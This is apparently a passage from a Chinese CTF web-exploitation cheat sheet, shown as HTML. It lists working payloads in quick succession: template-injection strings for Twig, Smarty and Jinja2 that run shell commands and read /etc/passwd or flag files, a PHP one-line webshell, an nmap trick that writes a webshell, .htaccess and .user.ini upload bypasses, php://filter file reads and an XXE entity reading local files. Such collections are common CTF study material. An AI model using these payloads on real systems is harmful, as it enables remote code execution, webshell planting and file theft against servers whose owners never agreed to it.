class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h2><p>判断模板</p>
+<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202405132152442.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>绿色是执行成功，红色是执行失败</p>
+<p>注入${7＊7}没有回显出49的情况，这种时候就是执行失败走红线，再次注入如果还是没有回显49就代表这里没有模板注入；如果注入回显了49代表执行成功，继续往下走注入，如果执行成功回显7777777说明是jinja2模板，如果回显是49就说明是Twig模板。<br>注入${7＊7}成功回显出49的情况，这种时候是执行成功走绿线，再次注入a{＊comment＊}b，如果执行成功回显ab，就说明是Smarty模板；如果没有回显出ab，就是执行失败走红线，注入${“z”.join(“ab”)}，如果执行成功回显出zab就说明是Mako模板。</p>
+<p>常用利用方式</p>
+<p>Twig</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.registerUndefinedFilterCallback</span>(<span class="hljs-name">&quot;exec&quot;</span>)&#125;&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">_self.env.getFilter</span>(<span class="hljs-name">&quot;cat /flag&quot;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>Smarty</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br><span class="language-xml">&#123;if system(&#x27;ls&#x27;)&#125;&#123;/if&#125;</span><br><span class="language-xml">&#123;if system(&#x27;cat /flag&#x27;)&#125;&#123;/if&#125;</span><br><span class="language-xml">// another</span><br><span class="language-xml">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;,self::clearConfig())&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>Jinja2<a target="_blank" rel="noopener" href="https://www.cnblogs.com/hetianlab/p/17273687.html">https://www.cnblogs.com/hetianlab/p/17273687.html</a></p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">#读取文件类，<span class="hljs-tag">&lt;<span class="hljs-name">type</span> ‘<span class="hljs-attr">file</span>’&gt;</span> file位置一般为40，直接调用</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[40](<span class="hljs-name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[40](<span class="hljs-name">&#x27;etc/passwd&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__bases__</span>[0].__subclasses__()[40](<span class="hljs-name">&#x27;etc/passwd&#x27;</span>).readlines()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[257](<span class="hljs-name">&#x27;flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> (python3)</span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#直接使用popen命令，python2是非法的，只限于python3</span><br><span class="language-xml">os._wrap_close 类里有popen</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[128].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[128].__init__.__globals__.popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用os的popen执行命令</span><br><span class="language-xml">#python2、python3通用</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[71].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[185].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__.__builtins__.__import__(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;id&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#python3专属</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__import__(<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用eval函数读取</span><br><span class="language-xml">#python2</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[61].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[29].__call__(<span class="hljs-name">eval</span>,<span class="hljs-string">&#x27;os.system(&quot;ls&quot;)&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">#python3</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__</span>[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__mro__</span>[-1].__subclasses__()[117].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__subclasses__()[250].__init__.__globals__.__builtins__.eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](<span class="hljs-name">&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用 importlib类</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128][&quot;load_module&quot;](<span class="hljs-name">&quot;os&quot;</span>)[&quot;popen&quot;](<span class="hljs-name">&quot;ls /&quot;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用linecache函数</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[59].__init__.__globals__[&#x27;linecache&#x27;][&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">[].__class__.__base__.__subclasses__</span>()[168].__init__.__globals__.linecache.os.popen(<span class="hljs-name">&#x27;ls /&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#调用communicate()函数</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__base__.__subclasses__</span>()[128](<span class="hljs-name">&#x27;whoami&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#写文件</span><br><span class="language-xml">写文件的话就直接把上面的构造里的read()换成write()即可，下面举例利用file类将数据写入文件。</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__bases__</span>[0].__bases__[0].__subclasses__()[40](<span class="hljs-name">&#x27;/tmp&#x27;</span>).write(<span class="hljs-name">&#x27;test&#x27;</span>)&#125;&#125;</span><span class="language-xml">  ----python2的str类型不直接从属于属于基类，所以要两次 .__bases__</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](<span class="hljs-name">&#x27;/etc/passwd&#x27;</span>).write(<span class="hljs-name">&#x27;123456&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">#通用 getshell</span><br><span class="language-xml">原理就是找到含有 __builtins__ 的类，然后利用。</span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].eval(<span class="hljs-name">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="language-xml">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">c.__init__.__globals__</span>[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;filename&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><span class="language-xml">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">for</span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">if</span> c.__name__==<span class="hljs-string">&#x27;catch_warnings&#x27;</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;</span>) &#125;&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endif</span> <span class="hljs-template-tag">%&#125;</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">endfor</span> <span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>Flask</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;) 是可以读取配置的</span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config</span>&#125;&#125;</span><span class="language-xml">应该是可以查看app.config的内容</span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">get_flashed_messages.__globals__</span>[&#x27;current_app&#x27;.config]&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">Z2V0X2ZsYXNoZWRfbWVzc2FnZXM</span>=.X19nbG9iYWxzX18=[‘current_app’.config]&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="常用后缀"><a href="#常用后缀" class="headerlink" title="常用后缀"></a>常用后缀</h3><p>.phtml</p>
+<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;SHELL&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="nmap执行"><a href="#nmap执行" class="headerlink" title="nmap执行"></a>nmap执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?host=’ <span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>(“shell”);?)&gt; -oG shell.php ’<br></code></pre></td></tr></table></figure>
+
+<h3 id="解析绕过"><a href="#解析绕过" class="headerlink" title="解析绕过"></a>解析绕过</h3><p>先利用报错来查看中间件为什么</p>
+<p>nginx -&gt; user.ini</p>
+<p>apache -&gt; .htaccess</p>
+<p>user.ini</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GIF89a<br><br><span class="hljs-attribute">auto_append_file</span>=shell.jpg<br></code></pre></td></tr></table></figure>
+
+<p>.htaccess</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="hljs-attribute">Sethandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>or</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span> &quot;<span class="hljs-attr">shell.jpg</span>&quot;&gt;</span><br>Sethandler application/x-httpd-php<br><span class="hljs-comment">&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;</span><br><br>Addhandler php5-script .jpg<br><span class="hljs-comment">&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>index.php.bat</p>
+<p>user.php.bak</p>
+<p>phpmyadmin</p>
+<p>robots.txt</p>
+<p>.git源码泄露，用GitHack下载源码</p>
+<p>&#x2F;<a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
+<h2 id="网页请求头"><a href="#网页请求头" class="headerlink" title="网页请求头"></a>网页请求头</h2><h3 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h3><p>Referer:<a target="_blank" rel="noopener" href="https://www.baidu.com/?start=1%E5%BD%93%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%91web%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8F%91%E9%80%81%E8%AF%B7%E6%B1%82%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E4%B8%80%E8%88%AC%E4%BC%9A%E5%B8%A6%E4%B8%8AReferer%EF%BC%8C%E5%91%8A%E8%AF%89%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%88%91%E6%98%AF%E4%BB%8E%E5%93%AA%E4%B8%AA%E9%A1%B5%E9%9D%A2%E9%93%BE%E6%8E%A5%E8%BF%87%E6%9D%A5%E7%9A%84%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B1%8D%E6%AD%A4%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E4%B8%80%E4%BA%9B%E4%BF%A1%E6%81%AF%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86%E3%80%82">https://www.baidu.com/?start=1当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器籍此可以获得一些信息用于处理。</a></p>
+<h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><p>User-Agent:Mozilla&#x2F;…，告诉HTTP服务器， 客户端使用的操作系统和浏览器的名称和版本。</p>
+<h3 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h3><p>Cookie是用来存储一些用户信息以便让服务器辨别用户身份的（大多数需要登录的网站上面会比较常见），比如cookie会存储一些用户的用户名和密码，当用户登录后就会在客户端产生一个cookie来存储相关信息，这样浏览器通过读取cookie的信息去服务器上验证并通过后会判定你是合法用户，从而允许查看相应网页。当然cookie里面的数据不仅仅是上述范围，还有很多信息可以存储是cookie里面，比如sessionid等。</p>
+<h3 id="X-Forwarded-For-Client-Ip-x-real-ip"><a href="#X-Forwarded-For-Client-Ip-x-real-ip" class="headerlink" title="X-Forwarded-For (Client-Ip,x-real-ip)"></a>X-Forwarded-For (Client-Ip,x-real-ip)</h3><p> X-Forwarded-For 请求头用于标识客户端的原始IP地址，特别是在通过代理服务器或负载均衡器等中间设备进行通信时。当请求从客户端传递到代理服务器时，代理服务器会将客户端的IP地址添加到X-Forwarded-For头中，以便目标服务器知道请求的来源。</p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p>伪协议读取<br>secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
+<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p>
+<p>伪协议写入<br>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,xxx(为相对应的base64编码)</p>
+<p>?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,I have a dream</p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinxin999/p/12521014.html">https://www.cnblogs.com/xinxin999/p/12521014.html</a></p>
+<h2 id="xml注入"><a href="#xml注入" class="headerlink" title="xml注入"></a>xml注入</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">feng</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;file:///flag&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">xml</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">xml</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6887#toc-2">从XML相关一步一步到XXE漏洞</a></p>
+<h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参数RCE，其实就是通过<strong>没有参数的函数</strong>达到命令执行的目的。</p>
